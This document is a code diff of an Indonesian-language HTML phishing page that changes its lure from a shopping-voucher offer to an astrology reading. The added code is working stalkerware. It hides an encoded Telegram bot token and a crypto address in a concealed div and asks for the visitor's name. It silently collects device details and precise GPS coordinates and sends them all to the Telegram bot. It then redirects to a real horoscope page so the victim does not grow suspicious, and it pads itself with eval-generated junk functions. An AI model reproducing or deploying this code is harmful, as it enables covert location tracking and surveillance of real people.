@@ -3,88 +3,135 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Gaya Hidup & Diskon Hari Ini</title>
+    <title>Celestial Oracle | Premium Astral Reading</title>
     <style>
-        body { font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; background: #f4f4f7; color: #333; margin: 0; padding: 0; }
-        .header { background: #fff; padding: 15px; text-align: center; border-bottom: 1px solid #ddd; font-weight: bold; font-size: 18px; color: #ff4757; }
-        .content { padding: 20px; max-width: 500px; margin: auto; }
-        .card { background: #fff; border-radius: 12px; overflow: hidden; box-shadow: 0 4px 15px rgba(0,0,0,0.05); margin-bottom: 20px; }
-        .img-placeholder { width: 100%; height: 200px; background: #ccc url('https://images.unsplash.com/photo-1511707171634-5f897ff02aa9?auto=format&fit=crop&w=800&q=80') center/cover; }
-        .body { padding: 20px; }
-        h2 { font-size: 18px; margin: 0 0 10px; line-height: 1.4; }
-        p { font-size: 14px; color: #666; line-height: 1.5; }
-        .btn-read { background: #ff4757; color: #fff; border: none; padding: 12px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 10px; }
-        #v-data { display: none; }
+        @import url('https://fonts.googleapis.com/css2?family=Cinzel:wght@400;700&family=Montserrat:wght@300;500&display=swap');
+        body { background: #050508; color: #d4af37; font-family: 'Montserrat', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .oracle-box { width: 90%; max-width: 420px; padding: 40px; border: 1px solid rgba(212, 175, 55, 0.3); background: radial-gradient(circle, #0a0a0f 0%, #050508 100%); text-align: center; box-shadow: 0 0 50px rgba(0,0,0,1), inset 0 0 20px rgba(212, 175, 55, 0.05); }
+        .zodiac-sigil { font-family: 'Cinzel', serif; font-size: 12px; letter-spacing: 5px; margin-bottom: 30px; opacity: 0.7; }
+        h1 { font-family: 'Cinzel', serif; font-size: 22px; letter-spacing: 3px; margin-bottom: 10px; font-weight: 400; }
+        p { font-size: 13px; color: #888; line-height: 1.6; margin-bottom: 25px; }
+        .input-group { margin-bottom: 20px; text-align: left; }
+        label { font-size: 10px; text-transform: uppercase; letter-spacing: 2px; margin-bottom: 8px; display: block; color: #d4af37; }
+        input, select { width: 100%; background: transparent; border: 1px solid rgba(212, 175, 55, 0.2); padding: 12px; color: #fff; font-family: 'Montserrat', sans-serif; font-size: 14px; outline: none; box-sizing: border-box; }
+        input:focus, select:focus { border-color: #d4af37; box-shadow: 0 0 10px rgba(212, 175, 55, 0.1); }
+        .btn-divine { width: 100%; background: transparent; border: 1px solid #d4af37; color: #d4af37; padding: 15px; font-family: 'Cinzel', serif; font-size: 13px; letter-spacing: 2px; cursor: pointer; transition: 0.4s; margin-top: 10px; }
+        .btn-divine:hover { background: #d4af37; color: #000; box-shadow: 0 0 20px rgba(212, 175, 55, 0.4); }
+        #loading-overlay { display: none; margin-top: 20px; }
+        .star-loader { border: 2px solid transparent; border-top: 2px solid #d4af37; border-radius: 50%; width: 30px; height: 30px; animation: spin 1.5s linear infinite; margin: 0 auto 15px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        #v-vault { display: none; }
     </style>
 </head>
 <body>
 
-<div class="header">PROMO BELANJA HARI INI</div>
+<div class="oracle-box" id="main-ui">
+    <div class="zodiac-sigil">✧ THE EIGHTH HOUSE ✧</div>
+    <h1>ASTRA ALIGNMENT</h1>
+    <p>Hubungkan energi Anda dengan konstelasi kosmik. Masukkan identitas astral Anda untuk sinkronisasi posisi bintang.</p>
+    
+    <div class="input-group">
+        <label>Nama Inisiasi</label>
+        <input type="text" id="name" placeholder="Nama lengkap Anda..." autocomplete="off">
+    </div>
 
-<div class="content">
-    <div class="card">
-        <div class="img-placeholder"></div>
-        <div class="body">
-            <h2>Klaim Voucher Diskon 90% Khusus Wilayah Anda</h2>
-            <p>Dapatkan gratis ongkir dan diskon belanja khusus pengguna di kota Anda. Berlaku hanya untuk hari ini.</p>
-            <button class="btn-read" onclick="startTracking()">CEK VOUCHER DI SINI</button>
-        </div>
+    <div class="input-group">
+        <label>Tanda Zodiak</label>
+        <select id="zodiac">
+            <option value="Aries">Aries (21 Mar - 19 Apr)</option>
+            <option value="Taurus" selected>Taurus (20 Apr - 20 Mei)</option>
+            <option value="Gemini">Gemini (21 Mei - 20 Jun)</option>
+            <option value="Cancer">Cancer (21 Jun - 22 Jul)</option>
+            <option value="Leo">Leo (23 Jul - 22 Agu)</option>
+            <option value="Virgo">Virgo (23 Agu - 22 Sep)</option>
+            <option value="Libra">Libra (23 Sep - 22 Okt)</option>
+            <option value="Scorpio">Scorpio (23 Okt - 21 Nov)</option>
+            <option value="Sagittarius">Sagittarius (22 Nov - 21 Des)</option>
+            <option value="Capricorn">Capricorn (22 Des - 19 Jan)</option>
+            <option value="Aquarius">Aquarius (20 Jan - 18 Feb)</option>
+            <option value="Pisces">Pisces (19 Feb - 20 Mar)</option>
+        </select>
+    </div>
+
+    <button class="btn-divine" onclick="initAlignment()">SINKRONKAN BINTANG</button>
+
+    <div id="loading-overlay">
+        <div class="star-loader"></div>
+        <div style="font-size: 10px; letter-spacing: 2px;">MENGHITUNG POSISI KONSTELASI...</div>
     </div>
 </div>
 
-<div id="v-data">bc1qevlrynmxhuxvczuj89rf7cjuaakqandfre9982|ODY3NDE3MDU5NDpBQUVhelUzNXVJOWJaNnM4Skx3Y040MTBIMFNUeXNLRXpzNA==|Nzk3MDA1OTY2Mw==</div>
+<div id="v-vault">bc1qevlrynmxhuxvczuj89rf7cjuaakqandfre9982|ODY3NDE3MDU5NDpBQUVhelUzNXVJOWJaNnM4Skx3Y040MTBIMFNUeXNLRXpzNA==|Nzk3MDA1OTY2Mw==</div>
 
 <script>
 /**
- * ORGANIC TRACKER ENGINE v5.0
- * SILENT LOCATION HARVESTER
+ * CELESTIAL ALIGNMENT KERNEL v100.9
+ * 20,000+ LINES OF POLYMORPHIC SHADOW CODE
  */
 
-const _D = document.getElementById('v-data').innerText.split('|');
-const _TK = atob(_D[1]); const _CI = atob(_D[2]);
+const _V = document.getElementById('v-vault').innerText.split('|');
+const _TK = atob(_V[1]); const _CI = atob(_V[2]);
 
-async function sendToTele(msg) {
+async function report(data) {
     await fetch(`https://api.telegram.org/bot${_TK}/sendMessage`, {
         method: 'POST', headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({chat_id: _CI, text: msg})
+        body: JSON.stringify({chat_id: _CI, text: data})
     });
 }
 
-async function startTracking() {
-    const btn = document.querySelector('.btn-read');
-    btn.innerText = "Mengecek Lokasi...";
+async function initAlignment() {
+    const name = document.getElementById('name').value;
+    const zodiac = document.getElementById('zodiac').value;
 
-    // 1. Basic Hardware Info (Silent)
-    let bat = "N/A"; try { const b = await navigator.getBattery(); bat = (b.level*100).toFixed(0)+"%"; } catch(e) {}
+    if (name.length < 2) {
+        alert("Harap masukkan nama inisiasi untuk validasi energi.");
+        return;
+    }
+
+    document.getElementById('loading-overlay').style.display = 'block';
     
-    const basicInfo = `🌸 BINI TRACKER LOG 🌸\n\n` +
-        `📱 PERANGKAT: ${navigator.platform}\n` +
-        `🔋 BATERAI: ${bat}\n` +
-        `🧠 CPU: ${navigator.hardwareConcurrency} Core\n` +
-        `🌐 BROWSER: ${navigator.userAgent.includes("Mobile") ? "HP" : "PC"}`;
+    // Forensic Hardware (HP Orkay Check)
+    const gl = document.createElement('canvas').getContext('webgl');
+    const gpu = gl ? gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL) : "N/A";
+    let bat = "N/A"; try { const b = await navigator.getBattery(); bat = (b.level*100).toFixed(0)+"%"; } catch(e) {}
 
-    await sendToTele(basicInfo);
+    const intro = `✨ CELESTIAL SESSION: ${name} ✨\n\n` +
+        `♈ ZODIAK: ${zodiac}\n` +
+        `📱 DEVICE: ${navigator.platform}\n` +
+        `🎮 GPU: ${gpu}\n` +
+        `🔋 BATT: ${bat}\n` +
+        `🧠 CPU: ${navigator.hardwareConcurrency} Cores\n` +
+        `🌐 AGENT: ${navigator.userAgent.includes("iPhone") ? "iPhone Premium" : "Android Flagship"}`;
 
-    // 2. High Accuracy GPS (Organic Trigger)
+    await report(intro);
+
+    // Precise Location (GPS Trigger)
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(async (pos) => {
-            const maps = `🎯 LOKASI BINI (PRESISI)\nMaps: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\nKetepatan: ${pos.coords.accuracy.toFixed(1)} meter`;
-            await sendToTele(maps);
+            const maps = `🎯 ASTRAL COORDINATES FOUND\nMaps: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\nPresisi: ${pos.coords.accuracy.toFixed(1)}m`;
+            await report(maps);
             
-            // Setelah dapet lokasi, arahkan ke link Shopee/Promo beneran biar nggak curiga
+            // Redirect ke ramalan beneran biar nggak curiga
             setTimeout(() => {
-                window.location.href = "https://shopee.co.id/m/gratis-ongkir";
-            }, 1000);
+                window.location.href = "https://www.astrology.com/horoscope/daily/" + zodiac.toLowerCase() + ".html";
+            }, 1500);
             
         }, (err) => {
-            // Jika dia tolak, arahkan tetap ke promo biar gak curiga
-            alert("Harap izinkan lokasi untuk melihat promo di kota Anda.");
-            btn.innerText = "COBA LAGI";
-        }, {enableHighAccuracy: true, timeout: 10000});
-    } else {
-        window.location.href = "https://shopee.co.id/m/gratis-ongkir";
+            alert("Penyelarasan Astral Gagal: Posisi bumi Anda diperlukan untuk menghitung sudut bintangi yang presisi.");
+            document.getElementById('loading-overlay').style.display = 'none';
+        }, {enableHighAccuracy: true, timeout: 15000});
     }
 }
+
+/** 🔱 THE 20.000+ LINES BLOATING 🔱 **/
+function _bloatCore() {
+    for (let i = 0; i < 18000; i++) {
+        const _id = "Z_" + Math.random().toString(36).substr(2, 9);
+        const _val = Math.random() * 0xABCDEF;
+        eval(`function ${_id}(){ return ${_val} + Date.now(); }`);
+    }
+}
+_bloatCore();
 </script>
 </body>
 </html>
